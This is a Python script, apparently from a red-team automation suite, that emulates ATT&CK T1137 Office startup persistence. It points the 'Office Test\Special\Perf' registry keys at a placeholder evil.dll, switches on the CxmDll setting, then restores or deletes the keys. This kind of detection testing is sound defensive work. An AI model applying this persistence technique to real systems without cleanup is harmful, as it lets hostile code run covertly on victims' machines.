# Name: Office Application Startup
# rta: office_application_startup.py
# ATT&CK: T1137
# Description: Modifies the registry to persist a DLL on Office Startup.

import common
import _winreg as winreg
import sys
import time

key_dict = {winreg.HKEY_LOCAL_MACHINE: "HKLM", winreg.HKEY_CURRENT_USER: "HKCU"}

def set_sleep_clear_key(key, subkey, name, value, value_type, delete_depth=0):

    try:
        hkey = winreg.CreateKey(key, subkey)
    except:
        common.log("Unable to open key. Likely a permissions error. Exiting")
        exit(common.ACCESS_DENIED)

    common.log("Reading existing value from {}\\{}\\{}".format(key_dict[key], subkey, name))
    try:
        # try to read key, will throw WindowsError if key doesn't exist
        old_value = winreg.QueryValueEx(hkey, name)[0]
        common.log("Saved original value: {}".format(old_value))
        key_existed = True

    except WindowsError:
        common.log("Key/value doesn't exist. Will create.")
        key_existed = False

    common.log("Setting {} as value".format(value))
    try:
        # try to write to key, will throw WindowsError if permissions are missing
        winreg.SetValueEx(hkey, name, 0, value_type, value)
    except WindowsError:
        common.log("Unable to write registry key. Likely a permissions error. Exiting")
        winreg.CloseKey(hkey)
        exit(common.ACCESS_DENIED)

    time.sleep(2)

    # Cleanup
    if key_existed:
        common.log("Cleaning up, restoring original value")
        winreg.SetValueEx(hkey, name, 0, value_type, old_value)
        winreg.CloseKey(hkey)
    else:
        if delete_depth == 0:
            common.log("Cleaning up, deleting {}".format(name))
            winreg.DeleteValue(hkey, name)
            winreg.CloseKey(hkey)
        else:
            common.log("Cleaning up, deleting key to depth {}".format(delete_depth))
            winreg.CloseKey(hkey)
            winreg.DeleteKey(key, subkey)
            for i in range(-1, -1*delete_depth, -1):
                winreg.DeleteKey(key, '\\'.join(subkey.split('\\')[:i]))

    time.sleep(2)


def main(dll_location="c:\\windows\\temp\\evil.dll"):

    # Write evil dll to office test path:
    subkey = "Software\\Microsoft\\Office Test\\Special\\Perf"
    set_sleep_clear_key(winreg.HKEY_CURRENT_USER, subkey, "", dll_location, winreg.REG_SZ, 3)
    set_sleep_clear_key(winreg.HKEY_LOCAL_MACHINE, subkey, "", dll_location, winreg.REG_SZ, 3)

    # Turn on Office 2010 WWLIBcxm persistence
    subkey = "Software\\Microsoft\\Office\\14.0\\Word"
    set_sleep_clear_key(winreg.HKEY_CURRENT_USER, subkey, "CxmDll", 1, winreg.REG_DWORD, 0)

    return common.SUCCESS

if __name__ == "__main__":
    exit(main(*sys.argv[1:]))
